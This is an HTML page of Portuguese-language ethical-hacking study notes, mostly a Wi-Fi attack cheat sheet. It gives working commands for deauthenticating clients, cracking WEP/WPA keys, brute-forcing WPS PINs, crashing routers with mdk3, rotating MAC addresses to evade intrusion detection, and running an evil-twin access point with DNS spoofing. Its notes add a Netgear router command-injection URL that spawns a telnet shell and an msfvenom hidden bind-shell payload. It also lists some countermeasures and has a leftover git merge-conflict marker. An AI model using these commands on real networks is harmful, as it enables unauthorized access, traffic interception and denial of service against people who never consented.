	<h2 id="airodump">airodump-ng</h2>
	<pre>
airodump-ng -c [canal] mon0               # fixa no canal
aireplay-ng -0 2 -a [bssid] mon0          # -0 = detauh. 2=num pacotes e -a bssid todas as estacoes
aireplay-ng -0 2 -a [bssid] -c [mac] mon0 # desconecta somente o mac
iwconfig mon0 channel 6                   # muda o canal caso esteja diferente
airodump-ng --encrypt wep mon0
airodump-ng -c 6 --bssid [mac router] -w ChaveWep mon0
airodump-ng -c 6 --bssid [mac router] --ivs -w ChaveWep mon0
	</pre>

	<h2 id="airolib-ng">airolib-ng</h2>
	<ol>
		<li>Create a new text file and put our target SSID in it. The SSID is Seclab</li>
		<li>
			We then create a database named seclab in airolib-ng and push the SSID inside the database by using the following command:
		    <div class="code">airolib-ng seclab –import essid /root/labfiles/wpacrack/ssid</div>
		</li>
		<li>
			Import the password dictionary into the database seclab. Use the following command to achieve that:
			<div class="code">airolib-ng seclab –import passwd /usr/share/wordlists/rockyou.txt
		    <br>airolib-ng seclab --stats</div>
		</li>
		<li>
			To generate the hashes, type the following command:
		    <div class="code">airolib-ng seclab --batch
		    <br>airolib-ng seclab --verify</div>
		</li>
		<li>
			Now run the following command:
		    <div class="code">aircrack-ng labfiles/wpacrack/ilovehate-01.cap -r seclab</div>
		</li>
	</ol>

	<p>Script para mudar o mac caso algum sistema de deteccao de intruso (WIPS) bloqueie meu mac:</p>
	<pre>
while true
do
   rede=$1
    aireplay-ng -0 1 -e $rede mon0 | grep “DeAuth"
    ifconfig mon0 down
    maccharger -r mon0 | grep “New MAC"
    ifconfig mon0 up
    sleep 5
done
	</pre>

	<h2 id="rainbowtables">Rainbow Tables</h2>

	<h3 id="genpmk">genpmk</h3>
	<p>Para gerar Rainbow Tables</p>
	<pre>
genpmk -f /usr/share/wordlists/rockyou.txt -d hash-teste –s SSIDdoAlvo
cowpatty -d hash-teste –r apt34-01.cap -s SSIDdoAlvo
	</pre>

	<h2 id="quebrarchaves">Quebrar Chaves WEP e WPA</h2>
	<p>
		WEP usa crypto analise. cada arquivo tem um vetor de inicializacao (ivs). depois de uma grande qtd de arquivos ele comeca a repetir o padrao.
		<br>Captura 10k de data para chave wep 64bit e 20k pra 128:
	</p>
	<pre>
aireplay-ng -3 -b [mac ap] -h [quem quero fingir ser] mon0 # -3 enviar pacotes arp. vai fingir ser uma maquina mandando ARP para o router fazendo responder mais e com isso com os vetores de arquivo.
	</pre>

	<h3>WEP</h3>
	<pre>
aircrack-ng -a 1 -e [ssid] ChaveWep-01.cap
	</pre>

	<h3>WPA</h3>
	<p>Tem que capturar o handshake. Para isso tem q esperar os clientes conectarem ou usar o aireplay.</p>
	<pre>
airdump-ng -c 6 --bssid=[mac router] -w CapturaWpa mon0
aireplay-ng -0 2 -e [ssid] mon0
	</pre>

	<p>Pode usar o aircrack-ng mas demora mais.</p>
	<pre>
aircrack-ng -w /usr/share/wordlists/rockyou.txt ChaveWpa-01.cap
pyrit -r ChaveWpa-01.cap -i /usr/share/wordlists/rockyou.txt attack_passthrought

# 1. Begin scanning
iwlist wlan0 scan

# 2. Setting up the monitoring mode
airmon-ng start wlan0

# 3. Capturing packets
airodump-ng -c (channel) -w (file name) --bssid (bssid) mon0

# 4. Cracking the password
# download dark0de.lst from http://www.filecrop.com/darkc0de.lst.html
aircrack-ng crack-01.cap --w dark0de.lst
	</pre>

	<h2 id="wps">WPS</h2>
	<h3>Descobrir PIN do WPS</h3>
	<p>
		Wi-Fi Protected Setup (WPS) is a wireless security protocol designed to allow users to simply secure wireless networks and reduce the complexity of adding new hosts. It is typically used on residential networks where technical expertise is often limited and simplicity is mandatory. The on boarding process leverage a PIN, which is either obtained from the AP's con guration interface, or may also be printed on a table af xed to the AP. It may also be associated with a button press that enables the device to begin the onboarding process.
		<br>WPS PIN feature is vulnerable to a brute force attack where an attacker is able to recover the WPA/WPA2 key on the device. Keep in mind that many vendors have released  rmware updates to address this exploit.
	</p>
	<pre>
wash -C -i mon0
airodump-ng --wps
reaver -i wlan0mon -b 90:94:e4:c8:04:e8 -c 11 –vv
	</pre>

	<h3>Destravando WPS Lock</h3>
	<p>A ideia é realizar diversos ataques para fazer o router travar. A maioria deles reseta o pin após o travamento.</p>
	<pre>
mdk3 # um aireplay melhorado para ataques de recusa de servico
mdk3 -i wlan0mon a -a [bssid]
mdk3 -i wlan0mon x 0 -t [bssid] -n [ssid] -s [num solicitacoes] # abrir outro terminal para rodar junto
mdk3 -i wlan0mon b -t [bssid]
	</pre>

	<h2 id="wifitools">Ohter Tools</h2>
	<ul>
		<li>Kismet is a wireless network detector/sni er that can be used to trace the data owing over the wireless communication medium.</li>
		<li>Fern is a Wi-Fi auditing GUI-based tool that is able to crack and recover WEP/WPA/WPS keys and also run other network-based attacks on wireless or Ethernet-based networks.</li>
		<li>
			BlueRanger is a simple Bash script that uses link quality to locate Bluetooth radio devices.
			<br>It sends L2CAP (Bluetooth) pings to create a connection between Bluetooth interfaces since most devices allow pings without any authentication or authorization.
			<div class="code">blueranger.sh hci0 6C:D4:8A:B0:20:AC</div>
		</li>
	</ul>

	<h2>Links</h2>
	<ul>
		<li><a href="http://routerpwn.com/">routerpwn.com</a>: catalogo de varias falhas em roteadores</li>
		<li><a href="https://www.youtube.com/watch?v=syneY5XNd8U">Video Wireless Hacking #1 - Redes ocultas e filtros de MAC</a></li>
		<li><a href="https://www.youtube.com/watch?v=nU_vUkFKZnk">Video Wireless Hacking #2 - Quebra de chaves WEP, WPA e WPS </a></li>
	</ul>
</div>

<div>
	<h1 id="eviltwin">Evil Twin</h1>
	<p>Consiste em levantar um AP falso e fazer os clientes se conectarem na máquina do atacante.</p>
	<pre>
airbase-ng -c 11 -e RedeNova wlan0mon

apt-get install isc-dhcp-server
vim /etc/default/isc-dhcp-server
DHCPD_CONF=/etc/dhcp/dhcpd.conf
INTERFACES="at0" # interface do airbase

iwconfig wlan0mon channel 6
airbase-ng -c 6 -e Escola -a [mac novo] wlan0mon
ifconfig at0 192.168.1.1 up
service isc-dhcp-server start
dnspoof -i at0 # qualquer url vai redirecionar para o servidor web local

# Usando um AP velho
Configurar a interface como bridge no virtualbox
definir ip na interface. ifconfig 192.168.0.50 netmask 255.255.255.0
dnsspoof -i eth0

# Fake AP conectando na internet
airbase-ng -e RedeNova -c 6 -Z 4 wlan0mon
aireplay -0 0 -b [bssid] wlna0mon # desconectar clientes da rede. automaticamente vao reconectar na rede mais potente de sinal

# Retirar ip das interfaces eth0 e at0
apt-get install bridge-utils
brctl addbr ponte
brctl addif ponte at0
brctl addif ponte eth0
ifconfig ponte up
dhclient ponte ou ifconfig ponte 192.168.2.210 netmask 255.255.255.0

# Alguns dominios o header hts redirecionam direto para https. Configurar o apache para https tambem.
dnschef --fakeip 192.168.1.107 --fakedomains *.google.com,*.globo.com --interface 192.168.1.107
	</pre>

	<h2>Links</h2>
	<ul>
		<li><a href="https://openwrt.org/">OpenWrt provides a fully writable filesystem with package management.</a></li>
		<li><a href="https://www.youtube.com/watch?v=DDGO5yDnJoY">Video HACKER ÉTICO #5 - Wireless Hacking #3 - Uso do Evil Twin e Honeypot</a></li>
	</ul>
</div>

<div>
	<h1 id="contramedidas">Contra Medidas</h1>
	<ul>
		<li>
			Usar tabela arp estatica ao inves de dinamica. <a href="http://arpon.sourceforge.net">arpon</a>. Protecao contra ARP poison:
			<div class="code">arp -s [ip do gateway] [mac do gateway]</div>
		</li>
		<li>Em switchs gerenciaveis, habilitar Dynamic Arp Inspection e DHCP snooping.</li>
	</ul>
</div>

<div>
	<h1 id="acoes">Ações do Hacker Ético</h1>
	<ul>
		<li>Fazer varredura</li>
		<li>Identificar vulnerabilidades</li>
		<li>Sugerir download de correcoes</li>
		<li>Gerar relatorio de status (patchs atualizados)</li>
		<li>Verificar se tem atualizacoes sobre as vulnerabilidades</li>
		<li>Usar NIPS (ips de rede) integrado com firewall. Ex.: PFSense</li>
		<li>Instalar nas maquinas um HIPS (IPS baseado em host) OSSEC Agent Manager</li>
	</ul>
</div>

<div>
<<<<<<< HEAD
=======
	<h1 id="reports">Relatório do Sumário Executivo e Laudo Técnico</h1>
	<div>Basicamente 2 versões:
		<p>1. Sumário executivo: preparado para os executivos da empresa. Ele condensa todos os problemas de uma forma visual, utilizando gráficos e tabelas para sintetizar todas as vulnerabilidades detectadas e as sugestões para correção das mesmas. Não possui informações técnicas profundas.</p>
		<p>2. Relatório técnico: preparado para os profissionais de segurança da empresa. Ele explica em detalhes todas as vulnerabilidades encontradas, mostrando tela a tela o resultado da exploração de cada problema, o impacto e sugestão de correção. É apresentado como se fosse um “tutorial” que foi feito.</p>
		<p>www.pentest-standard.org<br/>O pentester não arruma a segurança do cliente.</p>
	</div>

	<h2 id="terms">Termo de Responsabilidade e Confiabilidade</h2>
	<p>NDA - Non Disclosure Agreement</p>
</div>

<div>
>>>>>>> 062a8836e1449623b0e5668b1045f26584d48afe
	<h1 id="anotacoes">Anotações</h1>
	<pre>
Certificacoes para seguranca de app web
ECSP
EXIN ec-f level e-2 / professional

Utilizar WPA2 Enterprise com client-side certificates
Implementar WPS com diversos sensores espalhados pelo ambiente
Implementar HIDS para que os ataques de desautenticacao  sejam impedidos a nivel de host
Definir VLANs, filtro de acesso MAC e ocultar rede
Utilizar criptografia nos protocolos e servicos de camadas superiores
Proteger hosts contra arp poisoning (arp estatico)
Localizar e remover o Rogue AP e Evil Twin (trilateracao do sinal e wips)

WIPS gratuito: waidps

https://sourceforge.net/projects/valhalahoneypot/
https://books.google.com.br/books?id=DaC-CQAAQBAJ&printsec=frontcover&hl=pt-BR#v=onepage&q&f=false
https://www.youtube.com/watch?v=7_4_RXqCb04&feature=youtu.be

http://blog.valit.com.br/wp-blog/wp-content/uploads/2015/07/Simulado-Ethical-Hacking.pdf

Links
http://www.ehacknews.in/2016/11/top-5-offline-website-to-practice.html
http://www.amanhardikar.com/mindmaps/Practice.html
https://www.hacksplaining.com/
https://www.vulnhub.com/

BUGS
Router netgear
http://ROUTER_IP/cgi-bin/;telnetd$IFS-p$IFS'45' then connect to telnet on port 45
http://< router_IP >/cgi-bin/;COMMAND

msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.0.2 lport=443 -f psh-cmd > evil.bat
nc 192.168.0.5
ahost permitir que somente seu endereço se conecte a shell.

http://www.ip-adress.com/ip_tracer/
www.iptrackeronline.com
https://github.com/LionSec/xerosploit
https://github.com/reverse-shell/routersploit
https://github.com/shawarkhanethicalhacker/D-TECT
	</pre>
</div>

<div>
	<h1 id="tools">Tools, Sites and Posts</h1>
	<h2>Tools</h2>
	<ul>
		<li><a href="https://www.charlesproxy.com/download/">Charles Proxy: web debugging proxy application</a></li>
		<li><a href="https://wpscan.org/">WPScan is a black box WordPress vulnerability scanner</a></li>
		<li><a href="http://www.edge-security.com/theharvester.php">theHarvester: The information gathering suite</a></li>
		<li><a href="http://ha.ckers.org/fierce/">Fierce is a PERL script that quickly scans domains</a></li>
		<li><a href="https://anonymous-proxy-servers.net/en/jondo.html">JonDo will provide an anonymisation proxy for you, but it does NOT change your system setting</a></li>
		<li><a href="https://github.com/future-architect/vuls">Vulnerability scanner for Linux/FreeBSD, agentless, written in Go</a></li>
		<li><a href="https://github.com/synhack/mercure">Mercure is a tool for security managers who want to train their colleague to phishing</a></li>
	</ul>
	<h2>Sites</h2>
	<ul>
		<li><a href="https://www.exploit-db.com/google-hacking-database/">Google Hacking Database (GHDB)</a></li>
		<li><a href="http://www.netcraft.com/">NetCraft: Netcraft provide internet security services including anti-fraud and anti-phishing services, application testing and PCI scanning.</a></li>
		<li><a href="https://www.shodan.io/search?query=webcamxp">Shodan is the world's first search engine for Internet-connected devices</a></li>
		<li><a href="https://github.com/enaqx/awesome-pentest">A collection of awesome penetration testing resources</a></li>
		<li><a href="https://crackstation.net">Free Password Hash Cracker</a></li>
	</ul>
	<h2>Posts</h2>
	<ul>
		<li><a href="http://7habitsofhighlyeffectivehackers.blogspot.com.br/2012/05/using-twitter-to-build-password.html">Using twitter to build password cracking wordlist</a></li>
		<li><a href="http://www.kamranmohsin.com/2017/02/bypass-http-basic-authentication-nmap-metasploit/">Bypass HTTP Basic Authentication with Nmap and Metasploit</a></li>
	</ul>
</div>

</body>
</html>